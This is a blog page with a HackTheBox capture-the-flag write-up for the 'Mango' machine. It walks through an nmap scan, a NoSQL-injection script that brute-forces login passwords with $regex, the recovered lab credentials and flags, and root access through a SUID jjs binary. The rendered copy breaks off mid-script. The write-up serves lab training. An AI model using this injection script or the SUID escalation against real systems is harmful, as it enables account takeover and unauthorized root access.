<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Mango | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,medium"><meta name=description content="Mango HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/mango/><link crossorigin=anonymous href=/assets/css/stylesheet.35b906a90813b2766df33de5f84bf4610918496b745304c45e387646ed743bea.css integrity="sha256-NbkGqQgTsnZt8z3l+Ev0YQkYSWt0UwTEXjh2Ru10O+o=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/mango/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Mango "><meta property="og:description" content="Mango HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/mango/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/mango/mango.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-04-18T00:00:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/mango/mango.png"><meta name=twitter:title content="Mango "><meta name=twitter:description content="Mango HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Mango ","item":"https://s4ch.github.io/writeups/hackthebox/mango/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Mango ","name":"Mango ","description":"Mango HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","medium"],"articleBody":"≡ƒÆó Info Name: Mango Profile: www.hackthebox.eu Difficulty: Medium OS: Linux Points: 30 Overview Network enumeration: 22, 80, 443 Webapp discovery: SSL cert leaks subdomain in CN Webapp exploitation: mango -\u003e mongDB -\u003e noSQLi System enumeration: jjs history **System Privilege Escalation of Machine **: jjs SUID Network enumeration TL;DR: 22, 80, 443\nThis time I launched a full scan with nmap: nmap -A -oA nmap_full 10.10.10.162:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 # Nmap 7.80 scan initiated Thu Mar 26 23:50:11 2020 as: nmap -A -oA nmap_full 10.10.10.162 Nmap scan report for 10.10.10.162 Host is up (0.031s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA) | 256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA) |_ 256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: 403 Forbidden 443/tcp open ssl/http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Mango | Search Base | ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN | Not valid before: 2019-09-27T14:21:19 |_Not valid after: 2020-09-26T14:21:19 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.80%E=4%D=3/26%OT=22%CT=1%CU=31997%PV=Y%DS=2%DC=T%G=Y%TM=5E7D31B OS:F%P=x86_64-unknown-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A OS:)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54 OS:DST11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120 OS:)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+ OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=) OS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A OS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D OS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4 OS:0%CD=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 1025/tcp) HOP RTT ADDRESS 1 33.10 ms 10.10.14.1 2 33.13 ms 10.10.10.162 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Mar 26 23:50:39 2020 -- 1 IP address (1 host up) scanned in 28.40 seconds As for many boxes, we have only a web application and a SSH server.\nWebapp discovery TL;DR: SSL cert leaks subdomain in CN\nWhen we try to reach the port 80 (http://10.10.10.162) we are denied.\nOn port 443 (https://10.10.10.162) there is a search engine, but after a few minutes enumerating and fuzzing manually I concluded this was a rabbit hole.\nIf you look carefully at the nmap results, one of the scripts discloses us a subdomain.\n1 | ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN It is also possible to find it with openssl:\n1 2 3 $ openssl s_client -connect 10.10.10.162:443 ... issuer=C = IN, ST = None, L = None, O = Mango Prv Ltd., OU = None, CN = staging-order.mango.htb, emailAddress = admin@mango.htb So I set the IP matching staging-order.mango.htb in /etc/hosts:\n1 10.10.10.162 staging-order.mango.htb And when returning on port 80 (http://staging-order.mango.htb/) we are no longer denied.\nThis is a login page with a form:\nWebapp exploitation TL;DR: mango -\u003e mongDB -\u003e noSQLi\nHere a small guessing step is required.\nThe name of the box is mango, a popular NoSQL database is MongoDB, so it is suggesting that we have to exploit a NoSQLi, definitely on the auth form.\nFor people who never exploited a NoSQLi vulnerability before, you can find some payload on PayloadsAllTheThings. I contributed several time to the NoSQLi page so I know the payload that are here.\nI adapted one script to bruteforce the password of a given account.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import requests import urllib3 import string import urllib urllib3.disable_warnings() username=\"mango\" password=\"\" u=\"http://staging-order.mango.htb/\" headers={'content-type': 'application/x-www-form-urlencoded'} while True: for c in string.printable: if c not in ['*','+','.','?','|','\u0026','$']: payload='username=%s\u0026password[$regex]=^%s\u0026login=login' % (username, password + c) r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False) if 'Log in for ordering Sweet \u0026 Juicy Mango.' not in r.text or r.status_code == 302: print(\"Found one more char : %s\" % (password+c)) password += c Let’s run it for admin user:\n1 2 3 4 5 6 7 8 9 10 11 12 13 $ python bf.py Found one more char : t Found one more char : t9 Found one more char : t9K Found one more char : t9Kc Found one more char : t9KcS Found one more char : t9KcS3 Found one more char : t9KcS3\u003e Found one more char : t9KcS3\u003e! Found one more char : t9KcS3\u003e!0 Found one more char : t9KcS3\u003e!0B Found one more char : t9KcS3\u003e!0B# Found one more char : t9KcS3\u003e!0B#2 We can also run it for mango.\nFinally we have 2 accounts:\nadmin / t9KcS3\u003e!0B#2 mango / h3mXK8RhU~f{]f5H There is even a guy that made a small script / tool around this so you don’t have to change your script each time.\nIf you try to login with a accounts you will get this message:\n1 2 3 4 \u003ch1\u003eUnder Plantation\u003c/h1\u003e \u003ch2\u003eSorry for the inconvenience. We just started farming!\u003c/h2\u003e \u003ch3\u003eTo contact us in the meantime please email: admin@mango.htb\u003cbr /\u003e We rarely look at our inboxes.\u003c/h3\u003e System enumeration TL;DR: jjs history\nIt seems there is not more stuff to do on teh webapp.\nBut we can use the credentials to connect via ssh.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 $ ssh mango@10.10.10.162 mango@mango:~$ ls -lhA /home/admin/ total 40K lrwxrwxrwx 1 admin admin 9 Sep 27 14:30 .bash_history -\u003e /dev/null -rw-r--r-- 1 admin admin 220 Apr 4 2018 .bash_logout -rw-r--r-- 1 admin admin 3.7K Apr 4 2018 .bashrc -rw-rw-r-- 1 root admin 481 Mar 27 16:53 .jjs.history -rw-rw-r-- 1 admin admin 227 Mar 27 16:53 js drwxrwxr-x 3 admin admin 4.0K Mar 27 16:27 .local -rw-r--r-- 1 admin admin 807 Apr 4 2018 .profile -rw-rw-r-- 1 admin admin 8.5K Mar 27 16:31 test.py -r-------- 1 admin admin 33 Sep 27 14:29 user.txt mango@mango:~$ su admin Password: $ id uid=4000000000(admin) gid=1001(admin) groups=1001(admin) $ cd $ cat user.txt 79bf31c6c6eb38a8567832f7f8b47e92 We found the user flag we also saw there is a .jjs.history file.\nSystem Privilege Escalation of Machine TL;DR: jjs SUID\nSo let’s find where is the jjs binary on the file system.\n1 2 3 4 5 6 admin@mango:/home/admin$ ls -lh $(which jjs) lrwxrwxrwx 1 root root 21 Sep 27 14:15 /usr/bin/jjs -\u003e /etc/alternatives/jjs admin@mango:/home/admin$ ls -lh /etc/alternatives/jjs lrwxrwxrwx 1 root root 42 Sep 27 14:15 /etc/alternatives/jjs -\u003e /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs admin@mango:/home/admin$ ls -lh /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs -rwsr-sr-- 1 root admin 11K Jul 18 2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs We can see there is a SUID bit on the binary.\nAs each time we want to do an pe on Linux, let’s check GTFOBins first. There is a page for jjs.\nSo using the SUID pe payload we found on GTFOBins, we can elevate our privileges to root, and use this to read the root flag.\n1 2 3 4 $ echo \"Java.type('java.lang.Runtime').getRuntime().exec('cp /root/root.txt /tmp/.cyfun/cyfun.txt').waitFor()\" | jjs $ echo \"Java.type('java.lang.Runtime').getRuntime().exec('chmod g+rw /tmp/.cyfun/cyfun.txt').waitFor()\" | jjs $ cat /tmp/.cyfun/cyfun.txt 8a8ef79a7a2fbb01ea81688424e9ab15 ","wordCount":"1144","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/mango/mango.png","datePublished":"2020-04-18T00:00:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/mango/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Mango</h1><div class=post-description>Mango HackTheBox writeup</div><div class=post-meta><span title='2020-04-18 00:00:00 +0000 UTC'>April 18, 2020</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;1144 words&nbsp;·&nbsp;
<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
,
<a href=https://s4ch.github.io/tags/hackthebox/ class=post-tag title=hackthebox>hackthebox</a>
,
<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
,
<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
,
<a href=https://s4ch.github.io/tags/linux/ class=post-tag title=linux>linux</a>
,
<a href=https://s4ch.github.io/tags/medium/ class=post-tag title=medium>medium</a>
&nbsp;·&nbsp;
<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/mango/mango.png alt="Mango HackTheBox Machine"><p>Mango - Medium Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#ƒæó-info>≡ƒÆó Info</a></li></ul><ul><li><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#webapp-discovery>Webapp discovery</a></li><li><a href=#webapp-exploitation>Webapp exploitation</a></li><li><a href=#system-enumeration>System enumeration</a></li><li><a href=#system-privilege-escalation-of-machine>System Privilege Escalation of Machine</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h2 id=ƒæó-info>≡ƒÆó Info<a hidden class=anchor aria-hidden=true href=#ƒæó-info>#</a></h2><h1></h1><ul><li><strong>Name:</strong> Mango</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/214>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Medium</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 30</li></ul><h1></h1><h3 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h3><ul><li><strong>Network enumeration</strong>: 22, 80, 443</li><li><strong>Webapp discovery</strong>: SSL cert leaks subdomain in CN</li><li><strong>Webapp exploitation</strong>: mango -> mongDB -> noSQLi</li><li><strong>System enumeration</strong>: jjs history</li><li>**System Privilege Escalation of Machine **: jjs SUID</li></ul><h3 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h3><p><strong>TL;DR</strong>: 22, 80, 443</p><p>This time I launched a full scan with <a href=https://nmap.org/>nmap</a>: <code>nmap -A -oA nmap_full 10.10.10.162</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Nmap 7.80 scan initiated Thu Mar 26 23:50:11 2020 as: nmap -A -oA nmap_full 10.10.10.162
</span></span><span class=line><span class=cl>Nmap scan report for 10.10.10.162
</span></span><span class=line><span class=cl>Host is up (0.031s latency).
</span></span><span class=line><span class=cl>Not shown: 997 closed ports
</span></span><span class=line><span class=cl>PORT    STATE SERVICE  VERSION
</span></span><span class=line><span class=cl>22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
</span></span><span class=line><span class=cl>| ssh-hostkey: 
</span></span><span class=line><span class=cl>|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
</span></span><span class=line><span class=cl>|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
</span></span><span class=line><span class=cl>|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
</span></span><span class=line><span class=cl>80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
</span></span><span class=line><span class=cl>|_http-server-header: Apache/2.4.29 (Ubuntu)
</span></span><span class=line><span class=cl>|_http-title: 403 Forbidden
</span></span><span class=line><span class=cl>443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
</span></span><span class=line><span class=cl>|_http-server-header: Apache/2.4.29 (Ubuntu)
</span></span><span class=line><span class=cl>|_http-title: Mango | Search Base
</span></span><span class=line><span class=cl>| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
</span></span><span class=line><span class=cl>| Not valid before: 2019-09-27T14:21:19
</span></span><span class=line><span class=cl>|_Not valid after:  2020-09-26T14:21:19
</span></span><span class=line><span class=cl>|_ssl-date: TLS randomness does not represent time
</span></span><span class=line><span class=cl>| tls-alpn: 
</span></span><span class=line><span class=cl>|_  http/1.1
</span></span><span class=line><span class=cl>No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
</span></span><span class=line><span class=cl>TCP/IP fingerprint:
</span></span><span class=line><span class=cl>OS:SCAN(V=7.80%E=4%D=3/26%OT=22%CT=1%CU=31997%PV=Y%DS=2%DC=T%G=Y%TM=5E7D31B
</span></span><span class=line><span class=cl>OS:F%P=x86_64-unknown-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A
</span></span><span class=line><span class=cl>OS:)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54
</span></span><span class=line><span class=cl>OS:DST11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120
</span></span><span class=line><span class=cl>OS:)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+
</span></span><span class=line><span class=cl>OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
</span></span><span class=line><span class=cl>OS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A
</span></span><span class=line><span class=cl>OS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D
</span></span><span class=line><span class=cl>OS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4
</span></span><span class=line><span class=cl>OS:0%CD=S)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Network Distance: 2 hops
</span></span><span class=line><span class=cl>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>TRACEROUTE (using port 1025/tcp)
</span></span><span class=line><span class=cl>HOP RTT      ADDRESS
</span></span><span class=line><span class=cl>1   33.10 ms 10.10.14.1
</span></span><span class=line><span class=cl>2   33.13 ms 10.10.10.162
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl># Nmap done at Thu Mar 26 23:50:39 2020 -- 1 IP address (1 host up) scanned in 28.40 seconds
</span></span></code></pre></td></tr></table></div></div><p>As for many boxes, we have only a web application and a SSH server.</p><h3 id=webapp-discovery>Webapp discovery<a hidden class=anchor aria-hidden=true href=#webapp-discovery>#</a></h3><p><strong>TL;DR</strong>: SSL cert leaks subdomain in CN</p><p>When we try to reach the port 80 (http://10.10.10.162) we are denied.</p><p>On port 443 (https://10.10.10.162) there is a search engine, but after a few
minutes enumerating and fuzzing manually I concluded this was a rabbit hole.</p><p>If you look carefully at the <a href=https://nmap.org/>nmap</a> results, one of the scripts discloses us a
subdomain.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
</span></span></code></pre></td></tr></table></div></div><p>It is also possible to find it with <code>openssl</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ openssl s_client -connect 10.10.10.162:443
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>issuer=C = IN, ST = None, L = None, O = Mango Prv Ltd., OU = None, CN = staging-order.mango.htb, emailAddress = admin@mango.htb
</span></span></code></pre></td></tr></table></div></div><p>So I set the IP matching <code>staging-order.mango.htb</code> in <code>/etc/hosts</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>10.10.10.162 staging-order.mango.htb
</span></span></code></pre></td></tr></table></div></div><p>And when returning on port 80 (<a href=http://staging-order.mango.htb/>http://staging-order.mango.htb/</a>) we are no longer
denied.</p><p>This is a login page with a form:</p><p><img loading=lazy src=https://i.imgur.com/syrLOxL.jpg alt></p><h3 id=webapp-exploitation>Webapp exploitation<a hidden class=anchor aria-hidden=true href=#webapp-exploitation>#</a></h3><p><strong>TL;DR</strong>: mango -> mongDB -> noSQLi</p><p>Here a small guessing step is required.</p><p>The name of the box is <em>mango</em>, a popular NoSQL database is MongoDB, so it is
suggesting that we have to exploit a NoSQLi, definitely on the auth form.</p><p>For people who never exploited a NoSQLi vulnerability before, you can find
some payload on <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection>PayloadsAllTheThings</a>. I contributed several time
to the <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/commits/master/NoSQL%20Injection>NoSQLi page</a> so I know the payload that are here.</p><p>I adapted one script to bruteforce the password of a given account.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib3</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib</span>
</span></span><span class=line><span class=cl><span class=n>urllib3</span><span class=o>.</span><span class=n>disable_warnings</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>username</span><span class=o>=</span><span class=s2>&#34;mango&#34;</span>
</span></span><span class=line><span class=cl><span class=n>password</span><span class=o>=</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>u</span><span class=o>=</span><span class=s2>&#34;http://staging-order.mango.htb/&#34;</span>
</span></span><span class=line><span class=cl><span class=n>headers</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;content-type&#39;</span><span class=p>:</span> <span class=s1>&#39;application/x-www-form-urlencoded&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>string</span><span class=o>.</span><span class=n>printable</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>c</span> <span class=ow>not</span> <span class=ow>in</span> <span class=p>[</span><span class=s1>&#39;*&#39;</span><span class=p>,</span><span class=s1>&#39;+&#39;</span><span class=p>,</span><span class=s1>&#39;.&#39;</span><span class=p>,</span><span class=s1>&#39;?&#39;</span><span class=p>,</span><span class=s1>&#39;|&#39;</span><span class=p>,</span><span class=s1>&#39;&amp;&#39;</span><span class=p>,</span><span class=s1>&#39;$&#39;</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>            <span class=n>payload</span><span class=o>=</span><span class=s1>&#39;username=</span><span class=si>%s</span><span class=s1>&amp;password[$regex]=^</span><span class=si>%s</span><span class=s1>&amp;login=login&#39;</span> <span class=o>%</span> <span class=p>(</span><span class=n>username</span><span class=p>,</span> <span class=n>password</span> <span class=o>+</span> <span class=n>c</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>u</span><span class=p>,</span> <span class=n>data</span> <span class=o>=</span> <span class=n>payload</span><span class=p>,</span> <span class=n>headers</span> <span class=o>=</span> <span class=n>headers</span><span class=p>,</span> <span class=n>verify</span> <span class=o>=</span> <span class=kc>False</span><span class=p>,</span> <span class=n>allow_redirects</span> <span class=o>=</span> <span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=s1>&#39;Log in for ordering Sweet &amp; Juicy Mango.&#39;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span> <span class=ow>or</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>302</span><span class=p>:</span>
